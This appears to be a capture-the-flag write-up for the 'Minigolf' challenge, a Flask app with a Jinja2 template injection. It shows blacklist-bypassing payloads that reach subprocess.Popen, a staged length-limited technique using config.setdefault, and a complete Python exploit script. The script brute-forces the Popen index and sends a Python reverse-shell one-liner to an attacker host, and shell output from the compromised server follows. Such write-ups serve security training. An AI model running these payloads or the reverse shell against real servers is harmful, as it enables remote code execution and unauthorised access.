# Minigolf

### Description
Too much Flask last year... let's bring it back again.

### Code
```py
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

## Analysis

The vulnerability here is a jinja template injection in the flask server.
But there are a few restrictions which makes the exploiting harder.

1. We can't use the typical {{ }} Syntax and therefore can't print variables.
2. We dont have brackets which are used in most jinja exploits to get attributes from values to then find usable classes/functions.
3. We dont have underscore and therefore we cant simply use __class__ for example.
4. due to the usage of `html.escape` we can't use any strings like 'test' or "test" or \`test\`
5. We got a length limit of 69 chars which is quite small.

### Solutions:
#### First problem
For the first problem we can use other templating functionality. 
Like the {% %} Syntax where we can set variables or compare results with if, we could also run loops and so on.

#### Second problem
The second restriction can be avoided with the jinja filter `attr` which can be used like this:
`{%set x=variable|attr('subvariable')%}`
But the usage of the attr will greatly increase the size of the payload.

#### Third problem
The third one can be skipped if we don't ship the full payload in the txt field. We can access the variable `request.args.xxx` 
where `xxx` correlates to the given http get field which is applied in the request.
So we can do stuff like this:
```
http://localhost/?txt={%if request.args.x==request.args.y%}see{%endif%}&x=1&y=2
```
and we will see that if we both set `x` and `y` to an equal value we can see the text `see`
#### Fourth problem
The fourth problem is limiting but as long as we load all needed parameters from the args we will not have any problems with it.

#### Sixth problem
This is the last problem which needs to be addressed, but can only be fixed if we know how long our payload is with all 
given restrictions.

## Exploit

The first exploit can be crafted quite fast with the given solutions above:

```
{%set x=request.args%}{%set x=(a|attr(x.a)).mro()|last|attr(x.b)()|attr(x.c)(254)(x.d,shell=True)%}
```
where we got these as url parameters: `&a=__class__&b=__subclasses__&c=__getitem__&d=mkdir test`
if we remove the length restriction for this small test we can see we bypassed all blacklists and our exploits works.
> Note: that the id 254 must relate to the Popen class. You can find the index of this class by printing the subclasses 
> or bruteforcing it until it works typical between 0 and 500 but depends on the installed modules and so on.

But how should we fix the issue with the length even with the usage of the request args we are far above the 69 chars.
To be exact we are at 99 so 30 chars too much.

Now the real challenge kicked in, how to simplify the payload to fit the 69 chars? We tried long but did not succeed with any attempts.
So I choose to investigate if we can store variables over the current request. That would enable us to partial submit data and then build up on them

And I found a possible storage, the variable `config` does allow modification above the request.
This could be done over the function `setdefault` which sets a key and a default value for that key.
> Note: The function does not overwrite the key, so its a one trick on the selected key

This is how we can set variables:
```
{%set x=config.setdefault(request.args.x,request.args.y)%}
```
Http get fields: `&x=testkey&y=testvalue`

Now that we found a way to store variables we can focus on splitting our payload:
```
{%set x=request.args%}{%set x=(a|attr(x.a)).mro()|last|attr(x.b)()|attr(x.c)(254)(x.d,shell=True)%}
```
`&a=__class__&b=__subclasses__&c=__getitem__&d=mkdir test`

I came up with this parts which fit exact the 69 char limit:

***first we simplify the args access***
```
{%set x=config.setdefault(request.args.a,request.args)%}
```
This is done with the get fields: `a=z&b=__class__&c=__subclasses__&d=__getitem__&y1=y1&y2=y2&y3=y3`
the fields a, y1,y2,y3 are helper fields which will be used to set additional config variables.

***now fetch from config and store \_\_class\_\_ in y1***
```
{%set x=config%}{%set x=x.setdefault(x.z.y1,x|attr(x.z.b))%}
```

***now fetch y1 from config and store last mro in y2***
```
{%set x=config%}{%set x=x.setdefault(x.z.y2,x.y1.mro()|last)%}
```

***now fetch y2 from config and store \_\_subclasses\_\_() in y3***
```
{%set x=config%}{%set x=x.setdefault(x.z.y3,x.y2|attr(x.z.c)())%}
```

After these steps we have extended the config variable with a variable `y3` which now holds all subclasses.
Now we can simply iterate over them
```
{%set x=config.y3|attr(x.z.d)(999)(request.args.s,shell=True)%}
```
This is done with the get fields: `s=mkdir test`
> Note: change the index of Popen '999'

To make this process simpler and make the index of Popen guessable I created a simple script.
```python
import requests

url = 'http://minigolf.chal.imaginaryctf.org/'
reverse_host = 'xx.xx.xx.xx'
reverse_port = '13337'


def exploit(command, char_cache='f', char_help='g'):
    requests.get(url + '/', params={'txt': '{%set x=config.setdefault(request.args.a,request.args)%}',
                                    'a': char_cache,
                                    'b': '__class__',
                                    'c': '__subclasses__',
                                    'd': '__getitem__',
                                    char_help + '1': char_help + '1',
                                    char_help + '2': char_help + '2',
                                    char_help + '3': char_help + '3'})
    requests.get(url + '/', params={
        'txt': '{%set x=config%}{%set x=x.setdefault(x.' + char_cache + '.' + char_help + '1,x|attr(x.' + char_cache + '.b))%}'})
    requests.get(url + '/', params={
        'txt': '{%set x=config%}{%set x=x.setdefault(x.' + char_cache + '.' + char_help + '2,x.' + char_help + '1.mro()|last)%}'})
    requests.get(url + '/', params={
        'txt': '{%set x=config%}{%set x=x.setdefault(x.' + char_cache + '.' + char_help + '3,x.' + char_help + '2|attr(x.' + char_cache + '.c)())%}'})
    for i in range(1, 400):
        result = requests.get(url + '/',
                              params={
                                  'txt': '{%set x=config.' + char_help + '3|attr(config.' + char_cache + '.d)(' + str(
                                      i) + ')(request.args.s,shell=True)%}',
                                  's': command})
        if 'Internal Server Error' not in result.content.decode():
            print("last hit " + str(i))


reverse_shell = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + \
                reverse_host + "\"," + reverse_port + \
                "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
exploit(reverse_shell)
```

And we get a reverse shell to our defined server:
```
# ls -all
total 20
drwxr-xr-x 1 root root 4096 Jul 15 09:26 .
drwxr-xr-x 1 root root 4096 Jul 15 09:26 ..
-rw-r--r-- 1 root root  549 Jul 15 09:23 app.py
-rw-r--r-- 1 root root   29 Jun 30 05:41 flag.txt
-rwxr-xr-x 1 root root   41 Jul 15 09:25 run.sh
# cat flag.txt
ictf{whats_in_the_flask_tho}
```

So our flag is `ictf{whats_in_the_flask_tho}`.

-> cli-ish 17.07.2022